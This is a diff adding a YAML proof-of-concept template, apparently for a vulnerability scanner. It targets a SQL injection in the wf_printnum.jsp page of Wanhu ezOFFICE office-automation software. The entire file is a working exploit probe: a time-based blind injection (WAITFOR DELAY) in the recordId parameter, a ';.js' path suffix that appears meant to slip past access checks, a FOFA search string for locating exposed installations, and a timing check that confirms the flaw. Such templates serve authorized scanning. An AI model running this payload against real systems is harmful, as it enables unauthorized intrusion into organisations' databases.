@@ -1,0 +1,28 @@
+id: poc-yaml-wanhu-ezoffice-wf-printnum-jsp-sqli
+info:
+  name: 万户 ezOFFICE wf_printnum.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(body,"0") &&
+
+    !contains(body,"<") &&
+
+    contains(content_type,"text/xml") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
